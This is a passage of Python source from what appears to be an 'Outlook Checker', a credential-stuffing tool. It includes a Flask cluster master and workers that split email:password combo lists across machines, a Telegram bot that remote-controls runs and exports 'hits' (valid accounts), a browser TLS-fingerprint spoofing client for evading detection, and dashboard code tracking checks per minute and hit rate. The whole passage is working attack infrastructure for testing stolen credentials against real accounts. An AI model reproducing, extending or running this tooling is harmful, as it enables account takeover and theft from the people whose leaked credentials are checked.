            alive_count = sum(1 for p in proxies if p.get('alive', False))
            dead_count = len(proxies) - alive_count
            avg_lat = sum(latencies) / len(latencies) if latencies else 0
            return {
                'total_proxies': len(proxies),
                'alive': alive_count,
                'dead': dead_count,
                'avg_latency': round(avg_lat, 1),
                'fastest': round(min(latencies), 1) if latencies else 0,
                'slowest': round(max(latencies), 1) if latencies else 0
            }
        except Exception:
            return {}

    def get_peak_speed(self):
        with self._lock:
            if not self.data_points:
                return 0.0
            return max(p.get('speed', 0) for p in self.data_points)

    def get_average_speed(self):
        with self._lock:
            if not self.data_points:
                return 0.0
            speeds = [p.get('speed', 0) for p in self.data_points]
            return round(sum(speeds) / len(speeds), 2)

    def save(self, filename=None):
        if filename is None:
            filename = os.path.join(
                self.data_dir, f"analytics_{time.strftime('%Y%m%d_%H%M%S')}.json")
        with self._lock:
            data = {
                'start_time': self._start_time,
                'end_time': time.time(),
                'total_combos': self._total_combos,
                'total_points': len(self.data_points),
                'data_points': self.data_points
            }
        try:
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            return filename
        except Exception:
            return None

    @staticmethod
    def load(filename):
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
            return data.get('data_points', [])
        except Exception:
            return []

    @staticmethod
    def list_saved(data_dir='data'):
        try:
            files = [f for f in os.listdir(data_dir) if f.startswith(
                'analytics_') and f.endswith('.json')]
            files.sort(reverse=True)
            return files
        except Exception:
            return []


# ---- ClusterMaster / ClusterWorker (optional, keep for completeness) ----
class ClusterMaster:
    def __init__(self, combo_file, chunk_size=500, secret_token=None):
        self.combo_file = combo_file
        self.chunk_size = chunk_size
        self.secret_token = secret_token
        self.workers = {}
        self.chunks = []
        self.pending_chunks = []
        self.assigned_chunks = {}
        self.all_results = []
        self.worker_heartbeats = {}
        self.shared_config = {}
        self.lock = threading.Lock()
        self._prepare_chunks()
        self.app = self._create_app()

    def _prepare_chunks(self):
        if not os.path.exists(self.combo_file):
            return
        with open(self.combo_file, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip()
                      for line in f if line.strip() and ':' in line.strip()]
        chunk_id = 0
        for i in range(0, len(combos), self.chunk_size):
            chunk = combos[i:i + self.chunk_size]
            self.chunks.append((chunk_id, chunk))
            self.pending_chunks.append(chunk_id)
            chunk_id += 1

    def _check_auth(self, req):
        if self.secret_token is None:
            return None
        token = req.headers.get('X-Cluster-Token', '')
        if token != self.secret_token:
            return jsonify({'error': 'Unauthorized: invalid cluster token'}), 403
        return None

    def _create_app(self):
        app = Flask(__name__)
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        @app.route('/cluster/register', methods=['POST'])
        def register():
            auth_err = self._check_auth(request)
            if auth_err:
                return auth_err
            worker_id = str(uuid.uuid4())[:8]
            with self.lock:
                self.workers[worker_id] = {
                    'registered_at': time.time(),
                    'last_seen': time.time(),
                    'chunks_done': 0,
                    'results_count': 0
                }
                self.worker_heartbeats[worker_id] = time.time()
            return jsonify({'worker_id': worker_id, 'total_chunks': len(self.chunks)})

        @app.route('/cluster/work', methods=['GET'])
        def get_work():
            auth_err = self._check_auth(request)
            if auth_err:
                return auth_err
            worker_id = request.args.get('worker_id')
            if not worker_id or worker_id not in self.workers:
                return jsonify({'error': 'Invalid worker'}), 400
            with self.lock:
                self.workers[worker_id]['last_seen'] = time.time()
                if not self.pending_chunks:
                    return jsonify({'status': 'done', 'combos': []})
                chunk_id = self.pending_chunks.pop(0)
                self.assigned_chunks[chunk_id] = worker_id
                chunk_combos = self.chunks[chunk_id][1]
            return jsonify({
                'status': 'work',
                'chunk_id': chunk_id,
                'combos': chunk_combos
            })

        @app.route('/cluster/results', methods=['POST'])
        def submit_results():
            auth_err = self._check_auth(request)
            if auth_err:
                return auth_err
            data = request.get_json()
            worker_id = data.get('worker_id')
            chunk_id = data.get('chunk_id')
            results = data.get('results', [])
            if not worker_id or worker_id not in self.workers:
                return jsonify({'error': 'Invalid worker'}), 400
            with self.lock:
                self.all_results.extend(results)
                self.workers[worker_id]['chunks_done'] += 1
                self.workers[worker_id]['results_count'] += len(results)
                if chunk_id in self.assigned_chunks:
                    del self.assigned_chunks[chunk_id]
            return jsonify({'status': 'ok'})

        @app.route('/cluster/status', methods=['GET'])
        def status():
            auth_err = self._check_auth(request)
            if auth_err:
                return auth_err
            with self.lock:
                total = len(self.chunks)
                pending = len(self.pending_chunks)
                assigned = len(self.assigned_chunks)
                done = total - pending - assigned
                return jsonify({
                    'total_chunks': total,
                    'pending': pending,
                    'assigned': assigned,
                    'completed': done,
                    'total_results': len(self.all_results),
                    'workers': {
                        wid: {
                            'chunks_done': info['chunks_done'],
                            'results': info['results_count'],
                            'last_seen': int(time.time() - info['last_seen'])
                        }
                        for wid, info in self.workers.items()
                    }
                })

        @app.route('/cluster/heartbeat', methods=['POST'])
        def heartbeat():
            auth_err = self._check_auth(request)
            if auth_err:
                return auth_err
            data = request.get_json() or {}
            worker_id = data.get('worker_id')
            if not worker_id or worker_id not in self.workers:
                return jsonify({'error': 'Invalid worker'}), 400
            with self.lock:
                self.worker_heartbeats[worker_id] = time.time()
                self.workers[worker_id]['last_seen'] = time.time()
            return jsonify({'status': 'ok'})

        @app.route('/cluster/workers', methods=['GET'])
        def workers_detail():
            auth_err = self._check_auth(request)
            if auth_err:
                return auth_err
            now = time.time()
            with self.lock:
                worker_stats = {}
                for wid, info in self.workers.items():
                    last_hb = self.worker_heartbeats.get(
                        wid, info.get('registered_at', 0))
                    elapsed_since_hb = now - last_hb
                    is_dead = elapsed_since_hb > 90
                    reg_time = info.get('registered_at', now)
                    uptime = now - reg_time
                    speed = (info['results_count'] /
                             uptime) if uptime > 0 else 0.0
                    worker_stats[wid] = {
                        'id': wid,
                        'chunks_completed': info['chunks_done'],
                        'results_count': info['results_count'],
                        'last_heartbeat': round(elapsed_since_hb, 1),
                        'status': 'dead' if is_dead else 'active',
                        'speed': round(speed, 2)
                    }
            return jsonify({'workers': worker_stats})

        @app.route('/cluster/config', methods=['POST'])
        def push_config():
            auth_err = self._check_auth(request)
            if auth_err:
                return auth_err
            data = request.get_json() or {}
            config = data.get('config', {})
            with self.lock:
                self.shared_config.update(config)
            return jsonify({'status': 'ok', 'config': self.shared_config})

        @app.route('/cluster/config', methods=['GET'])
        def pull_config():
            auth_err = self._check_auth(request)
            if auth_err:
                return auth_err
            with self.lock:
                return jsonify({'config': dict(self.shared_config)})

        return app

    def _dead_worker_monitor(self):
        while True:
            time.sleep(30)
            now = time.time()
            with self.lock:
                dead_workers = []
                for wid, last_hb in self.worker_heartbeats.items():
                    if now - last_hb > 90:
                        dead_workers.append(wid)
                for chunk_id, assigned_wid in list(self.assigned_chunks.items()):
                    if assigned_wid in dead_workers:
                        del self.assigned_chunks[chunk_id]
                        if chunk_id not in self.pending_chunks:
                            self.pending_chunks.append(chunk_id)

    def start(self, port=9090):
        monitor_thread = threading.Thread(
            target=self._dead_worker_monitor, daemon=True)
        monitor_thread.start()
        thread = threading.Thread(
            target=lambda: self.app.run(
                host='0.0.0.0', port=port, debug=False, use_reloader=False),
            daemon=True
        )
        thread.start()
        return thread


class ClusterWorker:
    def __init__(self, master_url, checker_func, secret_token=None):
        self.master_url = master_url.rstrip('/')
        self.checker_func = checker_func
        self.worker_id = None
        self.secret_token = secret_token
        self._running = True

    def _get_headers(self):
        headers = {}
        if self.secret_token is not None:
            headers['X-Cluster-Token'] = self.secret_token
        return headers

    def register(self):
        import httpx
        try:
            with httpx.Client(timeout=10) as client:
                resp = client.post(
                    f"{self.master_url}/cluster/register",
                    headers=self._get_headers()
                )
                if resp.status_code == 200:
                    data = resp.json()
                    self.worker_id = data['worker_id']
                    return True
        except Exception:
            pass
        return False

    def fetch_work(self):
        import httpx
        try:
            with httpx.Client(timeout=10) as client:
                resp = client.get(
                    f"{self.master_url}/cluster/work",
                    params={'worker_id': self.worker_id},
                    headers=self._get_headers()
                )
                if resp.status_code == 200:
                    return resp.json()
        except Exception:
            pass
        return None

    def submit_results(self, chunk_id, results):
        import httpx
        try:
            with httpx.Client(timeout=10) as client:
                resp = client.post(
                    f"{self.master_url}/cluster/results",
                    json={
                        'worker_id': self.worker_id,
                        'chunk_id': chunk_id,
                        'results': results
                    },
                    headers=self._get_headers()
                )
                return resp.status_code == 200
        except Exception:
            return False

    def _send_partial_results(self, chunk_id, results):
        import httpx
        try:
            with httpx.Client(timeout=10) as client:
                client.post(
                    f"{self.master_url}/cluster/results",
                    json={
                        'worker_id': self.worker_id,
                        'chunk_id': chunk_id,
                        'results': results,
                        'partial': True
                    },
                    headers=self._get_headers()
                )
        except Exception:
            pass

    def _heartbeat_loop(self):
        import httpx
        while self._running:
            try:
                with httpx.Client(timeout=10) as client:
                    client.post(
                        f"{self.master_url}/cluster/heartbeat",
                        json={'worker_id': self.worker_id},
                        headers=self._get_headers()
                    )
            except Exception:
                pass
            time.sleep(30)

    def pull_config(self):
        import httpx
        try:
            with httpx.Client(timeout=10) as client:
                resp = client.get(
                    f"{self.master_url}/cluster/config",
                    headers=self._get_headers()
                )
                if resp.status_code == 200:
                    return resp.json().get('config', {})
        except Exception:
            pass
        return {}

    def run(self):
        if not self.register():
            print("Failed to register with master.")
            return
        print(f"Registered as worker {self.worker_id}")
        hb_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        hb_thread.start()
        while self._running:
            work = self.fetch_work()
            if not work:
                time.sleep(5)
                continue
            if work.get('status') == 'done':
                print("No more work available.")
                break
            chunk_id = work['chunk_id']
            combos = work['combos']
            print(f"Processing chunk {chunk_id} ({len(combos)} combos)")
            results = []
            for idx, combo in enumerate(combos, 1):
                if ':' not in combo:
                    continue
                email, password = combo.split(':', 1)
                try:
                    account, reason = self.checker_func(email, password)
                    results.append({'account': account, 'reason': reason})
                except Exception:
                    results.append(
                        {'account': f"{email}:{password}", 'reason': 'failed'})
                if idx % 10 == 0:
                    self._send_partial_results(chunk_id, results)
            self.submit_results(chunk_id, results)
            print(f"Chunk {chunk_id} done: {len(results)} results submitted")
        print("Worker finished.")

    def stop(self):
        self._running = False


# ---- TelegramBot ----
class TelegramBot:
    def __init__(self, token, allowed_chat_ids=None):
        self.token = token
        self.allowed_chat_ids = set(str(cid)
                                    for cid in (allowed_chat_ids or []))
        self.base_url = f"https://api.telegram.org/bot{token}"
        self._running = False
        self._thread = None
        self._offset = 0
        self.progress_interval = 300
        self._progress_thread = None
        self.get_stats = None
        self.pause_func = None
        self.resume_func = None
        self.stop_func = None
        self.set_threads_func = None
        self.get_proxy_stats_func = None
        self.add_proxy_func = None
        self.remove_proxy_func = None
        self.export_func = None
        self.get_config_func = None
        self.set_config_func = None
        self.get_top_hits_func = None

    def set_callbacks(self, get_stats=None, pause=None, resume=None, stop=None, set_threads=None,
                      get_proxy_stats=None, add_proxy=None, remove_proxy=None, export=None,
                      get_config=None, set_config=None, get_top_hits=None):
        self.get_stats = get_stats
        self.pause_func = pause
        self.resume_func = resume
        self.stop_func = stop
        self.set_threads_func = set_threads
        self.get_proxy_stats_func = get_proxy_stats
        self.add_proxy_func = add_proxy
        self.remove_proxy_func = remove_proxy
        self.export_func = export
        self.get_config_func = get_config
        self.set_config_func = set_config
        self.get_top_hits_func = get_top_hits

    def _is_authorized(self, chat_id):
        if not self.allowed_chat_ids:
            return True
        return str(chat_id) in self.allowed_chat_ids

    def send_message(self, chat_id, text, parse_mode='HTML', reply_markup=None):
        try:
            payload = {'chat_id': chat_id,
                       'text': text, 'parse_mode': parse_mode}
            if reply_markup:
                payload['reply_markup'] = json.dumps(reply_markup)
            with httpx.Client(timeout=10) as client:
                client.post(
                    f"{self.base_url}/sendMessage",
                    json=payload
                )
        except Exception:
            pass

    def _send_document(self, chat_id, file_path, caption=None):
        try:
            with open(file_path, 'rb') as f:
                files = {'document': (file_path.split('/')[-1], f)}
                data = {'chat_id': str(chat_id)}
                if caption:
                    data['caption'] = caption
                with httpx.Client(timeout=30) as client:
                    client.post(
                        f"{self.base_url}/sendDocument",
                        data=data,
                        files=files
                    )
        except Exception:
            self.send_message(chat_id, "\u26a0\ufe0f Failed to send document.")

    def _build_control_keyboard(self):
        return {
            'inline_keyboard': [
                [
                    {'text': '\u23f8 Pause', 'callback_data': 'pause'},
                    {'text': '\u25b6\ufe0f Resume', 'callback_data': 'resume'},
                    {'text': '\u23f9 Stop', 'callback_data': 'stop'}
                ]
            ]
        }

    def _format_status_message(self):
        if not self.get_stats:
            return None
        stats = self.get_stats()
        counters = stats.get('counters', {})
        total_checked = sum(counters.values())
        total_valid = (counters.get('valid', 0) + counters.get('2fa', 0) +
                       counters.get('consent', 0) + counters.get('pending_security', 0) +
                       counters.get('imap_valid', 0))
        return (
            "<b>\U0001f4ca Checker Status</b>\n\n"
            f"\u2705 Valid: <b>{total_valid:,}</b>\n"
            f"\u274c Invalid: <b>{counters.get('password', 0) + counters.get('not_exist', 0) + counters.get('invalid', 0):,}</b>\n"
            f"\U0001f512 Locked: <b>{counters.get('locked', 0):,}</b>\n"
            f"\U0001f4a8 Speed: <b>{stats.get('speed', 0):.1f}</b> acc/s\n"
            f"\U0001f4c8 Progress: <b>{total_checked:,}/{stats.get('total', 0):,}</b>\n"
            f"\u23f0 ETA: <b>{stats.get('eta', 'N/A')}</b>\n"
            f"\U0001f9f5 Threads: <b>{stats.get('active_threads', 0)}/{stats.get('target_threads', 0)}</b>"
        )

    def _handle_command(self, chat_id, text):
        text = text.strip()
        cmd = text.split()[0].lower() if text else ''
        if cmd == '/start':
            msg = (
                "<b>\U0001f680 Outlook Checker Bot</b>\n\n"
                "<b>Commands:</b>\n"
                "/status - Current stats and progress\n"
                "/pause - Pause all threads\n"
                "/resume - Resume paused threads\n"
                "/stop - Stop the checker\n"
                "/threads N - Set thread count\n"
                "/proxies - Proxy statistics\n"
                "/addproxy ip:port - Add a proxy\n"
                "/removeproxy ip:port - Remove a proxy\n"
                "/export [format] - Export results\n"
                "/config - View current config\n"
                "/setconfig key value - Update config\n"
                "/speed - Detailed speed stats\n"
                "/top - Top 5 hits\n"
                "/help - Show this message"
            )
            self.send_message(
                chat_id, msg, reply_markup=self._build_control_keyboard())
        elif cmd == '/help':
            self.send_message(chat_id,
                              "<b>\U0001f680 Outlook Checker Bot</b>\n\n"
                              "<b>Commands:</b>\n"
                              "/status - Current stats and progress\n"
                              "/pause - Pause all threads\n"
                              "/resume - Resume paused threads\n"
                              "/stop - Stop the checker\n"
                              "/threads N - Set thread count\n"
                              "/proxies - Proxy statistics\n"
                              "/addproxy ip:port - Add a proxy\n"
                              "/removeproxy ip:port - Remove a proxy\n"
                              "/export [format] - Export results\n"
                              "/config - View current config\n"
                              "/setconfig key value - Update config\n"
                              "/speed - Detailed speed stats\n"
                              "/top - Top 5 hits\n"
                              "/help - Show this message"
                              )
        elif cmd == '/status':
            msg = self._format_status_message()
            if msg:
                self.send_message(
                    chat_id, msg, reply_markup=self._build_control_keyboard())
            else:
                self.send_message(chat_id, "\u26a0\ufe0f Stats not available.")
        elif cmd == '/pause':
            if self.pause_func:
                self.pause_func()
                self.send_message(chat_id, "\u23f8\ufe0f Checker paused.")
            else:
                self.send_message(chat_id, "\u26a0\ufe0f Pause not available.")
        elif cmd == '/resume':
            if self.resume_func:
                self.resume_func()
                self.send_message(chat_id, "\u25b6\ufe0f Checker resumed.")
            else:
                self.send_message(
                    chat_id, "\u26a0\ufe0f Resume not available.")
        elif cmd == '/stop':
            self.send_message(chat_id, "\U0001f6d1 Stopping checker...")
            if self.stop_func:
                self.stop_func()
        elif cmd == '/threads':
            parts = text.split()
            if len(parts) >= 2 and parts[1].isdigit():
                n = int(parts[1])
                if 1 <= n <= 200:
                    if self.set_threads_func:
                        self.set_threads_func(n)
                        self.send_message(
                            chat_id, f"\U0001f9f5 Thread count set to <b>{n}</b>.")
                    else:
                        self.send_message(
                            chat_id, "\u26a0\ufe0f Thread control not available.")
                else:
                    self.send_message(
                        chat_id, "\u26a0\ufe0f Thread count must be 1-200.")
            else:
                self.send_message(
                    chat_id, "Usage: /threads N (e.g. /threads 20)")
        elif cmd == '/proxies':
            if self.get_proxy_stats_func:
                try:
                    ps = self.get_proxy_stats_func()
                    msg = (
                        "<b>\U0001f310 Proxy Statistics</b>\n\n"
                        f"\U0001f4e6 Total: <b>{ps.get('total', 0):,}</b>\n"
                        f"\u2705 Alive: <b>{ps.get('alive', 0):,}</b>\n"
                        f"\u274c Dead: <b>{ps.get('dead', 0):,}</b>\n"
                        f"\u26a1 Avg Latency: <b>{ps.get('avg_latency', 0):.0f}ms</b>"
                    )
                    self.send_message(chat_id, msg)
                except Exception:
                    self.send_message(
                        chat_id, "\u26a0\ufe0f Failed to retrieve proxy stats.")
            else:
                self.send_message(
                    chat_id, "\u26a0\ufe0f Proxy stats not available.")
        elif cmd == '/addproxy':
            parts = text.split(maxsplit=1)
            if len(parts) >= 2:
                proxy_str = parts[1].strip()
                if self.add_proxy_func:
                    try:
                        self.add_proxy_func(proxy_str)
                        self.send_message(
                            chat_id, f"\u2705 Proxy <b>{proxy_str}</b> added.")
                    except Exception:
                        self.send_message(
                            chat_id, "\u26a0\ufe0f Failed to add proxy.")
                else:
                    self.send_message(
                        chat_id, "\u26a0\ufe0f Add proxy not available.")
            else:
                self.send_message(chat_id, "Usage: /addproxy ip:port")
        elif cmd == '/removeproxy':
            parts = text.split(maxsplit=1)
            if len(parts) >= 2:
                proxy_str = parts[1].strip()
                if self.remove_proxy_func:
                    try:
                        self.remove_proxy_func(proxy_str)
                        self.send_message(
                            chat_id, f"\U0001f5d1 Proxy <b>{proxy_str}</b> removed.")
                    except Exception:
                        self.send_message(
                            chat_id, "\u26a0\ufe0f Failed to remove proxy.")
                else:
                    self.send_message(
                        chat_id, "\u26a0\ufe0f Remove proxy not available.")
            else:
                self.send_message(chat_id, "Usage: /removeproxy ip:port")
        elif cmd == '/export':
            parts = text.split()
            fmt = parts[1].strip() if len(parts) >= 2 else 'txt'
            if self.export_func:
                try:
                    filepath = self.export_func(fmt)
                    if filepath:
                        self._send_document(
                            chat_id, filepath, caption=f"\U0001f4c4 Export ({fmt})")
                    else:
                        self.send_message(
                            chat_id, "\u26a0\ufe0f Export returned no file.")
                except Exception:
                    self.send_message(chat_id, "\u26a0\ufe0f Export failed.")
            else:
                self.send_message(
                    chat_id, "\u26a0\ufe0f Export not available.")
        elif cmd == '/config':
            if self.get_config_func:
                try:
                    cfg = self.get_config_func()
                    lines = [f"\u2022 <b>{k}</b>: {v}" for k, v in cfg.items()]
                    msg = "<b>\u2699\ufe0f Current Config</b>\n\n" + \
                        "\n".join(lines)
                    self.send_message(chat_id, msg)
                except Exception:
                    self.send_message(
                        chat_id, "\u26a0\ufe0f Failed to retrieve config.")
            else:
                self.send_message(
                    chat_id, "\u26a0\ufe0f Config not available.")
        elif cmd == '/setconfig':
            parts = text.split(maxsplit=2)
            if len(parts) >= 3:
                key = parts[1].strip()
                value = parts[2].strip()
                if self.set_config_func:
                    try:
                        self.set_config_func(key, value)
                        self.send_message(
                            chat_id, f"\u2705 Config <b>{key}</b> set to <b>{value}</b>.")
                    except Exception:
                        self.send_message(
                            chat_id, "\u26a0\ufe0f Failed to set config.")
                else:
                    self.send_message(
                        chat_id, "\u26a0\ufe0f Set config not available.")
            else:
                self.send_message(chat_id, "Usage: /setconfig key value")
        elif cmd == '/speed':
            if self.get_stats:
                try:
                    stats = self.get_stats()
                    counters = stats.get('counters', {})
                    total_checked = sum(counters.values())
                    total_valid = (counters.get('valid', 0) + counters.get('2fa', 0) +
                                   counters.get('consent', 0) + counters.get('pending_security', 0) +
                                   counters.get('imap_valid', 0))
                    speed = stats.get('speed', 0)
                    cpm = speed * 60
                    hit_rate = (total_valid / total_checked *
                                100) if total_checked > 0 else 0.0
                    total = stats.get('total', 0)
                    remaining = total - total_checked
                    eta = (remaining / speed) if speed > 0 else 0
                    eta_str = time.strftime(
                        '%H:%M:%S', time.gmtime(eta)) if eta > 0 else 'N/A'
                    msg = (
                        "<b>\U0001f3ce Speed Details</b>\n\n"
                        f"\U0001f4a8 CPM: <b>{cpm:,.1f}</b>\n"
                        f"\u26a1 Checks/sec: <b>{speed:.2f}</b>\n"
                        f"\U0001f3af Hit Rate: <b>{hit_rate:.2f}%</b>\n"
                        f"\u2705 Valid/Checked: <b>{total_valid:,}/{total_checked:,}</b>\n"
                        f"\u23f3 ETA: <b>{eta_str}</b>\n"
                        f"\U0001f4c8 Remaining: <b>{remaining:,}</b>"
                    )
                    self.send_message(chat_id, msg)
                except Exception:
                    self.send_message(
                        chat_id, "\u26a0\ufe0f Failed to compute speed stats.")
            else:
                self.send_message(chat_id, "\u26a0\ufe0f Stats not available.")
        elif cmd == '/top':
            if self.get_top_hits_func:
                try:
                    hits = self.get_top_hits_func()
                    if not hits:
                        self.send_message(chat_id, "\U0001f4ad No hits yet.")
                        return
                    lines = []
                    for i, hit in enumerate(hits[:5], 1):
                        account = hit.get('account', 'N/A')
                        reason = hit.get('reason', 'N/A')
                        capture = hit.get('capture', '')
                        entry = f"{i}. <b>{account}</b>\n   Type: {reason}"
                        if capture:
                            entry += f"\n   Capture: {capture}"
                        lines.append(entry)
                    msg = "<b>\U0001f3c6 Top 5 Hits</b>\n\n" + \
                        "\n\n".join(lines)
                    self.send_message(chat_id, msg)
                except Exception:
                    self.send_message(
                        chat_id, "\u26a0\ufe0f Failed to retrieve top hits.")
            else:
                self.send_message(
                    chat_id, "\u26a0\ufe0f Top hits not available.")
        else:
            self.send_message(chat_id, "\u2753 Unknown command. Use /help.")

    def _handle_callback_query(self, chat_id, data):
        if data == 'pause':
            if self.pause_func:
                self.pause_func()
                self.send_message(chat_id, "\u23f8\ufe0f Checker paused.")
            else:
                self.send_message(chat_id, "\u26a0\ufe0f Pause not available.")
        elif data == 'resume':
            if self.resume_func:
                self.resume_func()
                self.send_message(chat_id, "\u25b6\ufe0f Checker resumed.")
            else:
                self.send_message(
                    chat_id, "\u26a0\ufe0f Resume not available.")
        elif data == 'stop':
            self.send_message(chat_id, "\U0001f6d1 Stopping checker...")
            if self.stop_func:
                self.stop_func()

    def _progress_reporter(self):
        while self._running:
            time.sleep(self.progress_interval)
            if not self._running:
                break
            msg = self._format_status_message()
            if msg:
                msg = "\U0001f504 <b>Auto Progress</b>\n\n" + msg
                for cid in self.allowed_chat_ids:
                    try:
                        self.send_message(int(cid), msg)
                    except Exception:
                        pass

    def _poll_loop(self):
        while self._running:
            try:
                with httpx.Client(timeout=35) as client:
                    resp = client.get(
                        f"{self.base_url}/getUpdates",
                        params={'offset': self._offset, 'timeout': 30}
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        for update in data.get('result', []):
                            self._offset = update['update_id'] + 1
                            message = update.get('message', {})
                            chat_id = message.get('chat', {}).get('id')
                            text = message.get('text', '')
                            if chat_id and text:
                                if self._is_authorized(chat_id):
                                    self._handle_command(chat_id, text)
                                else:
                                    self.send_message(
                                        chat_id, "\U0001f6ab Unauthorized.")
                            callback_query = update.get('callback_query')
                            if callback_query:
                                cb_chat_id = callback_query.get(
                                    'message', {}).get('chat', {}).get('id')
                                cb_data = callback_query.get('data', '')
                                if cb_chat_id:
                                    if self._is_authorized(cb_chat_id):
                                        self._handle_callback_query(
                                            cb_chat_id, cb_data)
                                    try:
                                        with httpx.Client(timeout=5) as cb_client:
                                            cb_client.post(
                                                f"{self.base_url}/answerCallbackQuery",
                                                json={
                                                    'callback_query_id': callback_query.get('id')}
                                            )
                                    except Exception:
                                        pass
            except Exception:
                time.sleep(5)

    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._poll_loop, daemon=True)
        self._thread.start()
        self._progress_thread = threading.Thread(
            target=self._progress_reporter, daemon=True)
        self._progress_thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)


# ---- TLS Spoof (optional) ----
class Response:
    def __init__(self, raw_response, *, backend):
        self._raw = raw_response
        self._backend = backend
        self.status_code = int(raw_response.status_code)
        self.text = raw_response.text
        self.url = str(raw_response.url)
        if backend == 'curl_cffi':
            self.headers = dict(raw_response.headers)
        else:
            self.headers = dict(raw_response.headers)

    def json(self, **kwargs):
        return self._raw.json(**kwargs)

    @property
    def content(self):
        return self._raw.content

    def raise_for_status(self):
        self._raw.raise_for_status()


class SpoofedClient:
    def __init__(self, proxy_url=None, impersonate=None, timeout=30):
        self._timeout = timeout
        self._profile = None
        if HAS_CURL_CFFI:
            self._backend = 'curl_cffi'
            target = impersonate or random.choice([
                'chrome120', 'chrome124', 'chrome126', 'edge101',
                'edge99', 'safari15_5', 'safari17_0', 'firefox120'
            ])
            kwargs = {'impersonate': target, 'timeout': timeout}
            if proxy_url:
                kwargs['proxies'] = {'http': proxy_url, 'https': proxy_url}
            self._client = CurlSession(**kwargs)
        else:
            self._backend = 'httpx'
            self._profile = get_random_profile()
            headers = self._profile.get_headers()
            headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            })
            self._client = httpx.Client(
                headers=headers,
                timeout=timeout,
                follow_redirects=True,
                proxy=proxy_url,
            )

    @property
    def is_spoofed(self):
        return self._backend == 'curl_cffi'

    def get(self, url, **kwargs):
        if self._backend == 'curl_cffi':
            kwargs.setdefault('timeout', self._timeout)
            raw = self._client.get(url, **kwargs)
        else:
            raw = self._client.get(url, **kwargs)
        return Response(raw, backend=self._backend)

    def post(self, url, **kwargs):
        if self._backend == 'curl_cffi':
            kwargs.setdefault('timeout', self._timeout)
            raw = self._client.post(url, **kwargs)
        else:
            raw = self._client.post(url, **kwargs)
        return Response(raw, backend=self._backend)

    def close(self):
        try:
            self._client.close()
        except Exception:
            pass

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()


def create_spoofed_client(proxy_url=None, profile=None, timeout=30):
    return SpoofedClient(proxy_url=proxy_url, impersonate=profile, timeout=timeout)


# ============================================================================
# WEB DASHBOARD (Flask + HTML)
# ============================================================================

# ---- Web dashboard globals ----
_get_counters_web = None
_get_active_threads_web = None
_target_threads_web = 0
_total_combos_web = 0
_start_time_web = None
_activity_log_web = []
_activity_lock_web = threading.Lock()
_proxy_monitor_web = None
_geo_proxy_pool_web = None
_rate_limiter_web = None
_database_web = None
_analytics_tracker_web = None
_api_key_web = None
_pause_func_web = None
_resume_func_web = None
_set_threads_func_web = None
_cpm_history_web = []
_cpm_lock_web = threading.Lock()
_last_checked_count_web = 0
_last_cpm_time_web = 0.0
_paused_web = False


def init_web_dashboard(
    get_counters_func,
    get_active_threads_func,
    target_threads,
    total_combos,
    *,
    proxy_monitor=None,
    geo_proxy_pool=None,
    rate_limiter=None,
    database=None,
    analytics_tracker=None,
    api_key=None,
    pause_func=None,
    resume_func=None,
    set_threads_func=None,
):
    global _get_counters_web, _get_active_threads_web, _target_threads_web, _total_combos_web, _start_time_web
    global _proxy_monitor_web, _geo_proxy_pool_web, _rate_limiter_web
    global _database_web, _analytics_tracker_web, _api_key_web
    global _pause_func_web, _resume_func_web, _set_threads_func_web
    global _last_checked_count_web, _last_cpm_time_web

    _get_counters_web = get_counters_func
    _get_active_threads_web = get_active_threads_func
    _target_threads_web = target_threads
    _total_combos_web = total_combos
    _start_time_web = time.time()

    _proxy_monitor_web = proxy_monitor
    _geo_proxy_pool_web = geo_proxy_pool
    _rate_limiter_web = rate_limiter
    _database_web = database
    _analytics_tracker_web = analytics_tracker
    _api_key_web = api_key
    _pause_func_web = pause_func
    _resume_func_web = resume_func
    _set_threads_func_web = set_threads_func

    _last_checked_count_web = 0
    _last_cpm_time_web = time.time()


def add_activity(thread_id, status, account):
    with _activity_lock_web:
        _activity_log_web.append({
            'time': time.strftime('%H:%M:%S'),
            'thread': thread_id,
            'status': status,
            'account': account if len(account) <= 50 else account[:47] + '...',
        })
        if len(_activity_log_web) > 200:
            del _activity_log_web[:100]


def record_cpm():
    global _last_checked_count_web, _last_cpm_time_web
    if _get_counters_web is None or _start_time_web is None:
        return
    now = time.time()
    counters = _get_counters_web()
    total_checked = sum(counters.values())
    delta_time = now - _last_cpm_time_web
    delta_checks = total_checked - _last_checked_count_web
    if delta_time > 0:
        cpm = (delta_checks / delta_time) * 60.0
    else:
        cpm = 0.0
    total_valid = (
        counters.get('valid', 0) + counters.get('2fa', 0)
        + counters.get('consent', 0) + counters.get('pending_security', 0)
        + counters.get('imap_valid', 0)
    )
    hit_rate = (total_valid / total_checked *
                100.0) if total_checked > 0 else 0.0
    with _cpm_lock_web:
        _cpm_history_web.append({
            'timestamp': now,
            'time_label': time.strftime('%H:%M:%S'),
            'cpm': round(cpm, 1),
            'hit_rate': round(hit_rate, 2),
            'total_checked': total_checked,
            'total_valid': total_valid,
        })
        if len(_cpm_history_web) > 720:
            del _cpm_history_web[:360]
    _last_checked_count_web = total_checked
    _last_cpm_time_web = now


def _cpm_recorder_loop():
    while True:
        try:
            record_cpm()
        except Exception:
            pass
        time.sleep(5)


def _format_elapsed(elapsed):
    h = int(elapsed // 3600)
    m = int((elapsed % 3600) // 60)
    s = int(elapsed % 60)
    return f"{h:02d}:{m:02d}:{s:02d}"


def _build_stats_dict():
    if _get_counters_web is None:
        return {}
    counters = _get_counters_web()
    active_threads = _get_active_threads_web() if _get_active_threads_web else 0
    total_checked = sum(counters.values())
    total_valid = (
        counters.get('valid', 0) + counters.get('2fa', 0)
        + counters.get('consent', 0) + counters.get('pending_security', 0)
